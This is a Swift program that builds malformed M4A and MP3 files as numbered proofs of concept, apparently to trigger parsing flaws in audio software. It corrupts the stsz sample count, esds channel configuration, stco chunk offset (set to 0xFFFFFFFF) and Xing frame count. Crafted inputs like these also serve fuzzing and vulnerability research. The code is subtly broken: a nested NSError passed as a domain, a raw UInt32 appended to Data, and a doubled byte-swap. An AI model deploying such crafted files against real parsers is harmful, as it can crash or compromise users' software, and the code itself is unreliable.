import Foundation
import AVFoundation
import CoreMedia

// Helper to parse and modify MP4 atoms for M4A files
class MP4AtomParser {
    var data: Data
    var position: Int = 0
    
    init(data: Data) {
        self.data = data
    }
    
    func readUInt32() -> UInt32 {
        guard position + 4 <= data.count else { return 0 }
        let value = data[position..<position+4].withUnsafeBytes { $0.load(as: UInt32.self).bigEndian }
        position += 4
        return value
    }
    
    func readData(count: Int) -> Data {
        guard position + count <= data.count else { return Data() }
        let subdata = data[position..<position+count]
        position += count
        return subdata
    }
    
    func findAtom(_ name: String) -> (offset: Int, size: Int)? {
        let nameData = name.data(using: .ascii)!
        position = 0
        while position < data.count {
            let start = position
            let sizeValue = readUInt32()
            let size = Int(sizeValue)
            if sizeValue == 0 && start + 8 >= data.count { return nil }
            guard size >= 8 || sizeValue == 0 else { return nil }
            let type = readData(count: 4)
            if type == nameData {
                return (offset: start, size: size)
            }
            if sizeValue == 0 { position = data.count }
            else { position = start + size }
            if position > data.count || size <= 0 { break }
        }
        return nil
    }
    
    func replaceData(at offset: Int, with newData: Data) {
        data.replaceSubrange(offset..<offset+newData.count, with: newData)
    }
}

// PoC 1: Inflate stsz sample count to 8192
func manipulatePoC1(inputURL: URL, outputURL: URL) throws {
    var data = try Data(contentsOf: inputURL)
    let parser = MP4AtomParser(data: data)
    
    guard let stsz = parser.findAtom("stsz") else {
        throw NSError(domain: "MP4", code: -1, userInfo: [NSLocalizedDescriptionKey: "stsz atom not found"])
    }
    
    let sampleCountOffset = stsz.offset + 12
    var newCountData = Data()
    newCountData.append(contentsOf: UInt32(8192).bigEndian.data)
    if sampleCountOffset + newCountData.count <= data.count && sampleCountOffset + newCountData.count <= stsz.offset + stsz.size {
        data.replaceSubrange(sampleCountOffset..<sampleCountOffset+newCountData.count, with: newCountData)
    } else {
        throw NSError(domain: "MP4PoC1", code: -2, userInfo: [NSLocalizedDescriptionKey: "stsz atom sample_count offset out of bounds."])
    }
    
    try data.write(to: outputURL)
    print("PoC 1: Set stsz sample count to 8192 in \(outputURL.path)")
}

// PoC 2: Set esds channel count to 8
func manipulatePoC2(inputURL: URL, outputURL: URL) throws {
    var data = try Data(contentsOf: inputURL)
    let parser = MP4AtomParser(data: data)
    
    guard let esds = parser.findAtom("esds") else {
        throw NSError(domain: "MP4", code: -1, userInfo: [NSLocalizedDescriptionKey: "esds atom not found"])
    }
    
    let channelConfigHeuristicOffset = esds.offset + 8 + 0x1B
    if channelConfigHeuristicOffset < data.count && channelConfigHeuristicOffset < esds.offset + esds.size {
        data.replaceSubrange(channelConfigHeuristicOffset..<channelConfigHeuristicOffset+1, with: Data([8]))
    } else {
        throw NSError(domain: "MP4PoC2", code: -2, userInfo: [NSLocalizedDescriptionKey: "esds atom channel configuration offset out of bounds."])
    }
    
    try data.write(to: outputURL)
    print("PoC 2: Set esds channel count to 8 in \(outputURL.path)")
}

// PoC 5: Set invalid stco offset to 0xFFFFFFFF
func manipulatePoC5(inputURL: URL, outputURL: URL) throws {
    var data = try Data(contentsOf: inputURL)
    let parser = MP4AtomParser(data: data)
    
    guard let stco = parser.findAtom("stco") else {
        throw NSError(domain: "MP4", code: -1, userInfo: [NSLocalizedDescriptionKey: "stco atom not found"])
    }
    
    let firstEntryOffset = stco.offset + 12
    var newData = Data()
    newData.append(contentsOf: UInt32(0xFFFFFFFF).bigEndian)
    parser.position = stco.offset + 8
    let entryCount = parser.readUInt32()
    if entryCount > 0 {
        if firstEntryOffset + 4 <= data.count {
            data.replaceSubrange(firstEntryOffset..<firstEntryOffset+4, with: newData)
        }
        else {
            throw NSError(domain: "MP4PoC5", code: -2, userInfo:[NSLocalizedDescriptionKey: "stco atom first entry offset out of bounds for replacement."])
        }
    }
    else {
        print("PoC 5: stco atom has no entries, skipping offset manipulation.")
        if inputURL != outputURL { try FileManager.default.copyItem(at: inputURL, to: outputURL) }
        print("PoC 5: Skipped stco offset manipulation as no entries found in \(outputURL.path)")
        return
    }
    
    try data.write(to: outputURL)
    print("PoCData 5: Set first stco chunk_offset to 0xFFFFFFFF in \(outputURL.path)")
}

// Generate MP3 files independently using AVAssetWriter
func generateMP3(filename: String, duration: Double, channels: Int, sampleRate: Double, pocNumber: Int) throws {
    let outputURL = URL(fileURLWithPath: filename)
    let frameCount = AVAudioFrameCount(duration * sampleRate)
    
    // Define PCM format for the encoder (interleaved LPCM)
    guard let pcmFormat = AVAudioFormat(commonFormat: .pcmFormatFloat32,
                                    sampleRate: sampleRate,
                                    channels: AVAudioChannelCount(channels),
                                    interleaved: true) else {
        throw NSError(domain: NSError(domain: "AudioFormat", code: -1, userInfo: [NSLocalizedDescriptionKey: "Failed to create PCM AVAudioFormat"]))
    }
    
    guard let buffer = AVAudioPCMBuffer(pcmFormat: pcmFormat, frameCapacity: frameCount) else {
        throw NSError(domain: "AudioBuffer", code: -1, userInfo: [NSLocalizedDescriptionKey: "Failed to create AVAudioPCMBuffer"])
    }
    buffer.frameLength = frameCount
    
    // Fill buffer with silence
    if pcmFormat.isInterleaved {
        if let data = buffer.audioBufferList.pointee.mBuffers.mData {
            memset(data, 0, Int(buffer.audioBufferList.pointee.sizeDataByteSize))
        } else {
            throw NSError(domain: "AudioBuffer", code: -2, userInfo: [NSLocalizedDescriptionKey: "PCM buffer mData is nil for interleaved silenced fill."])
        }
    } else {
        if let floatData = buffer.floatChannelData {
            for channelIdx in 0..<Int(pcmFormat.channelCount) {
                // No need for if let, floatData[channelIdx] is guaranteed non-nil
                let channelPtr = floatData[channelIdx]
                memset(channelPtr, 0, Int(frameCount) * MemoryLayout<Float>.size)
            }
        } else {
            throw NSError(domain: "AudioBuffer", code: -4, userInfo: [NSLocalizedDescriptionKey: "PCM buffer floatChannelData is nil for non-interleaved silenced fill."])
        }
    }
    
    // MP3 output settings
    let bitrate = pocNumber == 4 ? 320000 : 128000
    let outputSettings: [String: Any] = [
        AVFormatIDKey: kAudioFormatMPEGLayer3, // Fixed: Use correct MP3 format ID
        AVSampleRateKey: sampleRate,
        AVNumberOfChannelsKey: channels,
        AVEncoderBitRateKey: bitrate,
        AVEncoderAudioQualityKey: AVAudioQuality.medium.rawValue
    ]
    
    let audioInput = AVAssetWriterInput(mediaType: .audio, outputSettings: outputSettings, sourceFormatHint: pcmFormat.formatDescription)
    audioInput.expectsMediaDataInRealTime = false
    
    let writer = try AVAssetWriter(outputURL: outputURL, fileType: .mp3)
    guard writer.canAdd(audioInput) else {
        throw NSError(domain: "AVAssetWriter", code: -5, userInfo: [NSLocalizedDescriptionKey: "Cannot add audio input to writer"])
    }
    writer.add(audioInput)
    
    guard writer.startWriting() else {
        throw NSError(domain: "AVAssetWriter", code: -6, userInfo: [NSLocalizedDescriptionKey: "Failed to start writing. Error: \(writer.error?.localizedDescription ?? "Unknown")"])
    }
    writer.startSession(atSourceTime: .zero)
    
    // Create CMSampleBuffer
    var sampleBuffer: CMSampleBuffer?
    let audioBuffer = buffer.audioBufferList.pointee.mBuffers
    guard let mData = audioBuffer.mData else {
        throw NSError(domain: "AudioBufferData", code: -7, userInfo: [NSLocalizedDescriptionKey: "PCM buffer mData is nil before creating CMBlockBuffer"])
    }
    
    var blockBuffer: CMBlockBuffer?
    var status = CMBlockBufferCreateWithMemoryBlock(allocator: kCFAllocatorDefault,
                                                   memoryBlock: mData,
                                                   blockLength: Int(audioBuffer.mDataByteSize),
                                                   blockAllocator: kCFAllocatorNull,
                                                   customBlockSource: nil,
                                                   offsetToData: 0,
                                                   dataLength: Int(audioBuffer.mDataByteSize),
                                                   flags: kCMBlockBufferAssureMemoryNowFlag,
                                                   blockBufferOut: &blockBuffer)
    guard status == kCMBlockBufferNoErr, let createdBlockBuffer = blockBuffer else {
        throw NSError(domain: "CMBlockBuffer", code: Int(status), userInfo: [NSLocalizedDescriptionKey: "Failed to create CMBlockBuffer. OSStatus: \(status)"])
    }
    
    var timing = CMSampleTimingInfo(duration: CMTime(value: 1, timescale: Int32(sampleRate)), // Fixed: Use Int32(sampleRate)
                                    presentationTimeStamp: .zero,
                                    decodeTimeStamp: .invalid)
    
    status = CMSampleBufferCreate(allocator: kCFAllocatorDefault,
                                 dataBuffer: createdBlockBuffer,
                                 dataReady: true,
                                 makeDataReadyCallback: nil,
                                 refcon: nil,
                                 formatDescription: pcmFormat.formatDescription,
                                 sampleCount: CMItemCount(frameCount),
                                 sampleTimingEntryCount: 1,
                                 sampleTimingArray: &timing,
                                 sampleSizeEntryCount: 0,
                                 sampleSizeArray: nil,
                                 sampleBufferOut: &sampleBuffer)
    guard status == noErr, let createdSampleBuffer = sampleBuffer else {
        throw NSError(domain: "CMSampleBuffer", code: Int(status), userInfo: [NSLocalizedDescriptionKey: "Failed to create CMSampleBuffer. OSStatus: \(status)"])
    }
    
    guard audioInput.isReadyForMoreMediaData else {
        throw NSError(domain: "AVAssetWriterInput", code: -8, userInfo: [NSLocalizedDescriptionKey: "Audio input not ready for more data initially."])
    }
    
    audioInput.append(createdSampleBuffer)
    audioInput.markAsFinished()
    
    let semaphore = DispatchSemaphore(value: 0)
    writer.finishWriting {
        if let error = writer.error {
            print("Error during finishWriting: \(error.localizedDescription)")
        }
        semaphore.signal()
    }
    
    let waitResult = semaphore.wait(timeout: .now() + 30.0)
    if waitResult == .timedOut {
        writer.cancelWriting()
        throw NSError(domain: "AVAssetWriter", code: -9, userInfo: [NSLocalizedDescriptionKey: "MP3 generation timed out."])
    }
    
    if writer.status == .failed {
        throw writer.error ?? NSError(domain: "AVAssetWriter", code: Int(writer.status.rawValue), userInfo: [NSLocalizedDescriptionKey: "Writer failed. Status: \(writer.status.rawValue)"])
    } else if writer.status == .completed {
        print("PoC \(pocNumber): Generated MP3 at \(outputURL.path)")
    } else {
        print("Warning: Writer finished with status: \(writer.status.rawValue) for \(outputURL.path)")
    }
    
    // PoC 3: Add Xing frames=20000 metadata
    if pocNumber == 3 {
        var mp3Data = try Data(contentsOf: outputURL)
        let xingTag = "Xing".data(using: .ascii)!
        if let range = mp3Data.range(of: xingTag, options: [], in: 0..<min(mp3Data.count, 2048)) {
            let flagsOffset = range.upperBound
            guard mp3Data.count >= flagsOffset + 4 else {
                print("Warning: PoC 3 - Not enough data for Xing flags in \(filename)."); return
            }
            let flags = mp3Data[flagsOffset..<flagsOffset+4].withUnsafeBytes { $0.load(as: UInt32.self).bigEndian }
            var frameCountOffset = flagsOffset + 4
            let FRAMES_FLAG: UInt32 = 0x00000001
            if (flags & FRAMES_FLAG) != 0 {
                guard mp3Data.count >= frameCountOffset + 4 else {
                    print("Warning: PoC 3 - Not enough data for Xing frames count in \(filename)."); return
                }
                let frameCountData = UInt32(20000).bigEndian.data
                mp3Data.replaceSubrange(frameCountOffset..<frameCountOffset+4, with: frameCountData)
                try mp3Data.write(to: outputURL)
                print("PoC 3: Set Xing frames to 20000 in \(filename)")
            } else {
                print("Warning: Xing tag found in \(filename) for PoC 3, but FRAMES flag not set. Cannot write frame count.")
            }
        } else {
            print("Warning: Xing tag not found in \(filename) for PoC 3, skipping frames=20000 modification.")
        }
    }
}

extension UInt32 {
    var data: Data {
        var value = self.bigEndian
        return Data(bytes: &value, count: MemoryLayout<UInt32>.size)
    }
}

func main() {
    let fileManager = FileManager.default
    let defaultSampleRate = 44100.0
    let defaultChannels = 1
    
    for i in 1...5 {
        let inputFile = "base_poc\(i).m4a"
        let outputM4A = "poc\(i).m4a"
        let outputMP3 = "poc\(i).mp3"
        
        try? fileManager.removeItem(atPath: outputM4A)
        try? fileManager.removeItem(atPath: outputMP3)
        
        guard fileManager.fileExists(atPath: inputFile) else {
            print("Error: \(inputFile) not found. Please create dummy base_poc files.")
            exit(1)
        }
        
        let inputURL = URL(fileURLWithPath: inputFile)
        let outputM4AURL = URL(fileURLWithPath: outputM4A)
        
        do {
            switch i {
            case 1:
                try manipulatePoC1(inputURL: inputURL, outputURL: outputM4AURL)
            case 2:
                try manipulatePoC2(inputURL: inputURL, outputURL: outputM4AURL)
            case 3, 4:
                try fileManager.copyItem(at: inputURL, to: outputM4AURL)
                print("PoC \(i): Copied \(inputFile) to \(outputM4A) (M4A manipulation not applicable or done via MP3)")
            case 5:
                try manipulatePoC5(inputURL: inputURL, outputURL: outputM4AURL)
            default:
                break
            }
            
            try generateMP3(filename: outputMP3,
                            duration: 1.0,
                            channels: defaultChannels,
                            sampleRate: defaultSampleRate,
                            pocNumber: i)
            
        } catch {
            print("Error processing PoC \(i): \(error.localizedDescription)")
        }
        print("--- Completed PoC \(i) ---")
    }
    print("All PoCs processed.")
}

main()
